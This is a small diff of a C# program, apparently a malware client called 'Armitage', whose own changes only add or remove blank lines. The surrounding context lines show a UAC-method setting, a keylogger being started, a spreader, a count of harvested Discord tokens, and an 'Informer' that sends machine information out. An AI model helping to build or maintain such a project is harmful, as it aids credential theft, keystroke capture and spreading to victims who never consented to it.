@@ -14,6 +14,7 @@ namespace Client
     class Program
     {
         internal static int UACMethod = 0;
+
         /// <summary>
         /// Main entry point.
         /// </summary>
@@ -82,7 +83,6 @@ namespace Client
                 }
             }
 
-
             /// Start loggers.
             Armitage.Watchers.Keylogger.Start();
 
@@ -110,7 +110,6 @@ namespace Client
                 spreader.Start();
             }
             else { Console.WriteLine("found tokens : " + discord_tokens.Count.ToString()); }
-
 #endif
             /// Send machine info
             Armitage.Informer.Start();
